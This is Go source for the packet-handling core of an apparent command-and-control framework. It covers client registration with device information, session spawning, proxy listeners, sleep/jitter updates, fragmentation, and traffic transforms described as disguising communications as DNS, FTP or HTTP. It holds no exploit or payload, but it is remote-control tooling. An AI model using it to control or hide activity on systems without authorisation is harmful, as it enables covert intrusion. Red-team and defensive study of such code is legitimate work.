package c2

import (
	"context"
	"io"
	"net"
	"sync"
	"sync/atomic"
	"time"

	"github.com/PurpleSec/logx"
	"github.com/iDigitalFlame/xmt/com"
	"github.com/iDigitalFlame/xmt/com/limits"
	"github.com/iDigitalFlame/xmt/data"
	"github.com/iDigitalFlame/xmt/device"
	"github.com/iDigitalFlame/xmt/util"
	"github.com/iDigitalFlame/xmt/util/xerr"
)

// Message ID Values are a byte value from 0 to 255 (uint8).
//
// This value will assist in determining the action of the specified value.
// Values under 20 (<20) are considered system ID values and are used for controlling the Client session and
// invoking system specific functions. System functions are handled directly by the Session thread to prevent any lagtime
// during processing. Many system functions do not have a return.
//
// Custom Message ID Values are defined in the "task" package.
//
// Message ID Value Mappings
//
// MvInvalid  -  0: Invalid ID value. This value is always zero and is used to detect corrupted or invalid data.
// MvNop      -  1: Instructs the server or client to wait until the next wakeup as there is no data to return.
// MvHello    -  2: Initial ID value to send to the server as a client to begin the registration process. By design, this
//                  Packet should contain the device information struct.
// MvDrop     -  8: Packet that carries a Flag that is used to indicate to the responding client that the frag group
//                  In the flags needs to be dropped. This is only effective for one sequential packet stream.
// MvError    -  7: Used to inform that the Job ID that this Packet contains resulted in an error. By design, this Packet
//                  should contain a string value that describes the error.
// MvSpawn    - 17: Instructs the client Session to spawn a separate and independent Session from the current one. By design,
//                  this Packet payload should include an address to connect to and an optional Profile struct. If the Profile
//                  struct is not provided, the new Session will use the current Profile.
// MvProxy    - 18: Instructs the client to open a new Listener to proxy traffic from other clients to the server. By design,
//                  the Packet payload should include a listening address and a Profile struct. These options will specify
//                  the listening Proxy type and Profile used.
// MvResult   - 20: The first non-system ID value. This is used to respond to any Tasks issued with the payload of the
//                  Packet containing the Task result output.
// MvUpdate   -  6: Instructs the client to update it's time/jitter settings from the server. This Packet should contain
//                  an uint8 (jitter) and a uint64 (sleep) in the payload. This has no effect on the server.
// MvRegister -  3: Sent by the server to a client when a client attempts to communicate to a server that it has not
//                  previously registered with. By design, the client should re-invoke the MvHello packet with the device
//                  information to establish a proper connection to the target server.
//                  If this packet contains a frag group, it is also considered a MvDrop packet.
// MvComplete -  4: Response by the server when a client issues a MvHello packet. This indicates that registration is
//                  successful and the client may start the standard communication protocol.
// MvShutdown -  5: Indicates shutdown by the server or client. If sent by the client, the server will remove the client
//                  Session from its database on the next cycle. If sent by the server, this instructs the client process
//                  to stop working and perform cleanup functions.
// MvMultiple - 19: Indicates that the Packet payload contains multiple separate Packets. This also indicates to the Packet
//                  reader that the Frag settings on the Packet should be read as Multi-Packet length and size values instead.
const (
	MvInvalid  uint8 = 0x00
	MvNop      uint8 = 0x01
	MvHello    uint8 = 0x02
	MvDrop     uint8 = 0x08
	MvError    uint8 = 0x07
	MvSpawn    uint8 = 0x11
	MvProxy    uint8 = 0x12
	MvResult   uint8 = 0x14
	MvUpdate   uint8 = 0x06
	MvRegister uint8 = 0x03
	MvComplete uint8 = 0x04
	MvShutdown uint8 = 0x05
	MvMultiple uint8 = 0x13
)

var (
	buffers = sync.Pool{
		New: func() interface{} {
			return new(data.Chunk)
		},
	}
	wake waker
)

type waker struct{}
type event struct {
	s     *Session
	p     *com.Packet
	j     *Job
	jFunc func(*Job)
	sFunc func(*Session)
	nFunc func(*com.Packet)
	pFunc func(*Session, *com.Packet)
}
type client interface {
	Connect(string) (net.Conn, error)
}
type connection struct {
	Mux Mux

	s      *Server
	w      Wrapper
	t      Transform
	ctx    context.Context
	log    logx.Log
	cancel context.CancelFunc
}
type listener interface {
	Listen(string) (net.Listener, error)
}
type notifier interface {
	accept(uint16)
	frag(uint16, uint16, uint16)
}

// Wrapper is an interface that wraps the binary streams into separate stream types. This allows for using
// encryption or compression (or both!).
type Wrapper interface {
	Wrap(io.WriteCloser) (io.WriteCloser, error)
	Unwrap(io.ReadCloser) (io.ReadCloser, error)
}

// Transform is an interface that can modify the data BEFORE it is written or AFTER is read from a Connection.
// Transforms may be used to mask and unmask communications as benign protocols such as DNS, FTP or HTTP.
type Transform interface {
	Read(io.Writer, []byte) error
	Write(io.Writer, []byte) error
}

// ConnectFunc is a wrapper alias that will fulfil the client interface and allow using a single function
// instead of creating a struct to create connections. This can be used in all Server 'Connect' function calls.
type ConnectFunc func(string) (net.Conn, error)

// ListenerFunc is a wrapper alias that will fulfil the listener interface and allow using a single function
// instead of creating a struct to create listeners. This can be used in all Server 'Listen' function calls.
type ListenerFunc func(string) (net.Listener, error)

func (waker) accept(_ uint16) {}
func returnBuffer(c *data.Chunk) {
	c.Clear()
	buffers.Put(c)
}
func (waker) frag(_, _, _ uint16) {}
func (e *event) process(l logx.Log) {
	defer func(x logx.Log) {
		if err := recover(); err != nil && x != nil {
			if Logging {
				x.Error("Server event processing function recovered from a panic: %s!", err)
			}
		}
	}(l)
	switch {
	case e.pFunc != nil && e.p != nil && e.s != nil:
		e.pFunc(e.s, e.p)
	case e.jFunc != nil && e.j != nil:
		e.jFunc(e.j)
	case e.nFunc != nil && e.p != nil:
		e.nFunc(e.p)
	case e.sFunc != nil && e.s != nil:
		e.sFunc(e.s)
	}
	e.p, e.s, e.j = nil, nil, nil
	e.pFunc, e.sFunc, e.jFunc = nil, nil, nil
}

// Connect fulfills the serverClient interface.
func (c ConnectFunc) Connect(a string) (net.Conn, error) {
	return c(a)
}
func notify(l *Listener, s *Session, p *com.Packet) error {
	if (l == nil && s == nil) || p == nil || p.Device.Empty() {
		return nil
	}
	if s != nil && !p.Device.Equal(s.Device.ID) && p.Flags&com.FlagMultiDevice == 0 {
		if s.swarm != nil && s.swarm.accept(p) {
			return nil
		}
		if p.ID == MvRegister {
			p.Device = s.Device.ID
		} else {
			return xerr.New(`received a Session ID "` + p.Device.String() + `"that does not match our own ID "` + s.ID.String() + `"`)
		}
	}
	if l != nil && p.Flags&com.FlagOneshot != 0 {
		if l.Oneshot != nil {
			l.s.events <- event{p: p, nFunc: l.Oneshot}
		} else if l.Receive != nil {
			l.s.events <- event{p: p, pFunc: l.Receive}
		}
		return nil
	}
	if s == nil || (p.ID <= MvHello && p.Flags&com.FlagData == 0) {
		return nil
	}
	switch {
	case p.Flags&com.FlagData != 0 && p.Flags&com.FlagMulti == 0 && p.Flags&com.FlagFrag == 0:
		n := new(com.Packet)
		if err := n.UnmarshalStream(p); err != nil {
			return err
		}
		p.Clear()
		return notify(l, s, n)
	case p.Flags&com.FlagMulti != 0:
		x := p.Flags.Len()
		if x == 0 {
			return ErrInvalidPacketCount
		}
		for i := uint16(0); i < x; i++ {
			n := new(com.Packet)
			if err := n.UnmarshalStream(p); err != nil {
				return err
			}
			notify(l, s, n)
		}
		p.Clear()
		return nil
	case p.Flags&com.FlagFrag != 0 && p.Flags&com.FlagMulti == 0:
		if p.ID == MvDrop || p.ID == MvRegister {
			if Logging {
				s.log.Warning("[%s] Indicated to clear Frag Group %X!", s.ID, p.Flags.Group())
			}
			if atomic.StoreUint32(&s.last, uint32(p.Flags.Group())); p.ID != MvRegister {
				return nil
			}
			break
		}
		if p.Flags.Len() == 0 {
			return ErrInvalidPacketCount
		}
		if p.Flags.Len() == 1 {
			p.Flags.Clear()
			notify(l, s, p)
			return nil
		}
		var (
			g     = p.Flags.Group()
			c, ok = s.frags[g]
		)
		if !ok && p.Flags.Position() > 0 {
			s.send <- &com.Packet{ID: MvDrop, Flags: p.Flags}
			return nil
		}
		if !ok {
			c = new(cluster)
			s.frags[g] = c
		}
		if err := c.add(p); err != nil {
			return err
		}
		if n := c.done(); n != nil {
			notify(l, s, n)
			delete(s.frags, g)
		}
		s.frag(p.Job, p.Flags.Len(), p.Flags.Position())
		return nil
	}
	notifyClient(l, s, p)
	return nil
}
func notifyClient(l *Listener, s *Session, p *com.Packet) {
	if s != nil {
		switch p.ID {
		case MvUpdate:
			if j, err := p.Uint8(); err == nil && j <= 100 {
				s.jitter = j
			}
			if t, err := p.Uint64(); err == nil && t > 0 {
				s.sleep = time.Duration(t)
			}
			if Logging {
				s.log.Debug("[%s] Updated Sleep/Jitter settings from server (%s/%d%%).", s.ID, s.sleep.String(), s.jitter)
			}
			if p.Job > 0 {
				s.send <- &com.Packet{ID: MvResult, Job: p.Job}
			}
			if p.Flags&com.FlagData == 0 {
				return
			}
		case MvShutdown:
			if s.parent != nil {
				if Logging {
					s.log.Debug("[%s] Client indicated shutdown, acknowledging and closing Session.", s.ID)
				}
				s.Write(&com.Packet{ID: MvShutdown, Job: 1})
			} else {
				if s.done > flagOpen {
					return
				}
				if Logging {
					s.log.Debug("[%s] Server indicated shutdown, closing Session.", s.ID)
				}
			}
			s.Close()
			return
		case MvRegister:
			if s.swarm != nil {
				for _, v := range s.swarm.clients {
					v.send <- &com.Packet{ID: MvRegister, Job: uint16(util.FastRand())}
				}
			}
			n := &com.Packet{ID: MvHello, Job: uint16(util.FastRand())}
			device.Local.MarshalStream(n)
			// Bug here causes panic.
			// Need to determine when channel is closed.
			if n.Close(); atomic.LoadUint32(&s.done) < flagFinished {
				s.send <- n
			}
			if len(s.send) == 1 {
				s.Wake()
			}
			if p.Flags&com.FlagData == 0 {
				return
			}
		}
	}
	if l != nil && l.Receive != nil {
		l.s.events <- event{s: s, p: p, pFunc: l.Receive}
	}
	if s == nil {
		return
	}
	if s.Receive != nil {
		l.s.events <- event{s: s, p: p, pFunc: s.Receive}
	}
	if len(s.recv) == cap(s.recv) {
		// INFO: Clear the buffer of the last Packet as we don't want to block
		<-s.recv
	}
	if s.done == flagFinished {
		return
	}
	s.recv <- p
	select {
	case <-s.s.ch:
		return
	default:
	}
	switch {
	case s.Mux != nil:
		s.s.events <- event{p: p, s: s, pFunc: s.Mux.Handle}
	case s.parent.Mux != nil:
		s.s.events <- event{p: p, s: s, pFunc: s.parent.Mux.Handle}
	case s.s.Scheduler != nil:
		s.s.events <- event{p: p, s: s, pFunc: s.s.Scheduler.Handle}
	}
}

// Listen fulfills the serverListener interface.
func (l ListenerFunc) Listen(a string) (net.Listener, error) {
	return l(a)
}
func readPacket(c io.Reader, w Wrapper, t Transform) (*com.Packet, error) {
	var (
		b      = buffers.Get().(*data.Chunk)
		n, err = b.ReadFrom(c)
	)
	if err != nil && err != io.EOF {
		returnBuffer(b)
		return nil, xerr.Wrap("unable to read from stream reader", err)
	}
	if n == 0 || err == io.EOF {
		returnBuffer(b)
		return nil, xerr.Wrap("unable to read from stream reader", io.ErrUnexpectedEOF)
	}
	if b.Close(); t != nil {
		var (
			i   = buffers.Get().(*data.Chunk)
			err = t.Read(i, b.Payload())
		)
		if returnBuffer(b); err != nil {
			returnBuffer(i)
			return nil, xerr.Wrap("unable to transform reader", err)
		}
		b = i
	}
	var r data.Reader = b
	if w != nil {
		u, err := w.Unwrap(b)
		if err != nil {
			returnBuffer(b)
			return nil, xerr.Wrap("unable to wrap stream reader", err)
		}
		r = data.NewReader(u)
	}
	p := new(com.Packet)
	err = p.UnmarshalStream(r)
	if returnBuffer(b); err != nil && err != io.EOF {
		return nil, xerr.Wrap("unable to read from cache reader", err)
	}
	if err := r.Close(); err != nil {
		return nil, xerr.Wrap("unable to close cache reader", err)
	}
	if p.Device.Empty() || p.ID == MvInvalid {
		return nil, xerr.Wrap("unable to read from stream (bad packet)", io.ErrNoProgress)
	}
	return p, nil
}
func writePacket(c io.Writer, w Wrapper, t Transform, p *com.Packet) error {
	var (
		b             = buffers.Get().(*data.Chunk)
		s data.Writer = b
	)
	if w != nil {
		x, err := w.Wrap(b)
		if err != nil {
			returnBuffer(b)
			return xerr.Wrap("unable to wrap writer", err)
		}
		s = data.NewWriter(x)
	}
	if err := p.MarshalStream(s); err != nil {
		returnBuffer(b)
		return xerr.Wrap("unable to write to cache writer", err)
	}
	p.Clear()
	if err := s.Close(); err != nil {
		returnBuffer(b)
		return xerr.Wrap("unable to close cache writer", err)
	}
	if t != nil {
		var (
			i   = buffers.Get().(*data.Chunk)
			err = t.Write(i, b.Payload())
		)
		if returnBuffer(b); err != nil {
			returnBuffer(i)
			return xerr.Wrap("unable to transform writer:", err)
		}
		b = i
	}
	_, err := b.WriteTo(c)
	if returnBuffer(b); err != nil {
		return xerr.Wrap("unable to write to stream writer", err)
	}
	return nil
}
func nextPacket(n notifier, c chan *com.Packet, p *com.Packet, i device.ID) (*com.Packet, *com.Packet, error) {
	if limits.Packets <= 1 {
		if p != nil {
			n.accept(p.Job)
			return p, nil, nil
		}
		if len(c) > 0 {
			k := <-c
			n.accept(k.Job)
			return k, nil, nil
		}
		return nil, nil, nil
	}
	var (
		t, s int
		m, a bool
		x, w *com.Packet
	)
	for t < limits.Packets {
		if p == nil {
			if len(c) == 0 {
				if t == 1 && a && !m {
					n.accept(x.Job)
					return x, nil, nil
				}
				break
			}
			p = <-c
		}
		if p.Verify(i) {
			a = true
		} else {
			m = true
		}
		if s += p.Size(); s >= limits.Frag {
			if a && !m && t == 0 {
				n.accept(p.Job)
				return p, x, nil
			}
			if a && !m && t == 1 {
				n.accept(x.Job)
				return x, p, nil
			}
			if w != nil {
				break
			}
		}
		if t++; t == 1 && !m && a {
			if x != nil && n != nil {
				n.accept(x.Job)
			}
			x, p = p, nil
			continue
		}
		if w == nil {
			w = &com.Packet{ID: MvMultiple, Device: i, Flags: com.FlagMulti}
			if x != nil {
				w.Tags, x.Tags = x.Tags, nil
				if x.MarshalStream(w); x.Flags&com.FlagChannel != 0 {
					w.Flags |= com.FlagChannel
				}
				n.accept(x.Job)
				x.Clear()
				x = nil
			}
		}
		w.Tags, p.Tags = append(w.Tags, p.Tags...), nil
		if p.MarshalStream(w); p.Flags&com.FlagChannel != 0 {
			w.Flags |= com.FlagChannel
		}
		n.accept(p.Job)
		p.Clear()
		p = nil
	}
	if !a {
		m, t = true, t+1
		(&com.Packet{ID: MvNop, Device: i}).MarshalStream(w)
	}
	if w.Close(); m {
		w.Flags |= com.FlagMultiDevice
	}
	w.Flags.SetLen(uint16(t))
	return w, x, nil
}
